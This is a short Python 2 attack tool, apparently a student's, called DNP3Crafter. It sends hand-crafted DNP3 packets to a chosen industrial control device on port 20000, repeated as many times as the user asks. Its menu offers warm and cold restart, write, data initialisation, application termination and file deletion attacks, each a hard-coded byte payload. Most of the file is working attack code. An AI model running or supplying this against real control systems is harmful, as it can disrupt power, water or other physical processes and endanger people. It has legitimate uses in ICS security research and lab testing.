#! /usr/bin/env python

__author__  = "David Olano"
__version__ = "1.0"
__email__   = "david.olano@estudiante.uam.es"
__status__  = "Production"

'''DNP3Crafter'''

import sys
import socket
import time

if __name__ == "__main__":

    print "    ___     __   ___  _____    ___              __  _              "
    print "   /   \ /\ \ \ / _ \|___ /   / __\_ __  __ _  / _|| |_  ___  _ __ "
    print "  / /\ //  \/ // /_)/  |_ \  / /  | '__|/ _` || |_ | __|/ _ \| '__|"
    print " / /_/// /\  // ___/  ___) |/ /___| |  | (_| ||  _|| |_|  __/| |   "
    print "/___,' \_\ \/ \/     |____/ \____/|_|   \__,_||_|   \__|\___||_|\n "
        
    if len(sys.argv) != 2:
        print '\nMissing arguments!'
        print 'Try ./emisor.py dst-ip'
        print 'Exiting...'
        quit()

    ipdst = sys.argv[1]    
    destport= 20000   #DNP3 standard port

   

    ''' Options selector '''

    print 'Choose one action to perform:'
    print '1: Health check'
    print '2: Warm Restart attack'
    print '3: Cold Restart attack'
    print '4: Write attack'
    print '5: Initialize data attack'
    print '6: App function termination attack'
    print '7: Delete file attack'
    print ''

    attack_type = int(raw_input())

    print 'Choose number of repetitions:'

    attack_count = int(raw_input())  
    
    ''' Create custom DNP3 packet '''

    if attack_type == 1:
        dnp3="\x05\x64\x05\xc0\x01\x00\x00\x04\xe9\x21" 

    if attack_type == 2:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0e\x6c\xd1" 

    if attack_type == 3:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0d\x8E\x8B" 

    if attack_type == 4:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x02\x9d\xf7" 

    if attack_type == 5:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0f\x32\xe7" 

    if attack_type == 6:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x12\xf6\x45" 

    if attack_type == 7:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x1b\x21\x8c" 

    ''' Perform selected attack '''

    i = 0
    packet=dnp3
    print ''

    while (i < attack_count):

        try:
            mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	    mysocket.connect((ipdst,destport)) 
	    mysocket.send(packet)
	    mysocket.close()
	    i=i+1
	    time.sleep(1.02) #Time lapse between packets (in seconds)
	    print 'Sent' , i , 'repetitions...'

	except:
	    print('Terrible Error!')
	    import traceback
	    traceback.print_exc()
	    print("cannot bind port :(")
            exit(1) 

    print 'Finished.\n'
    







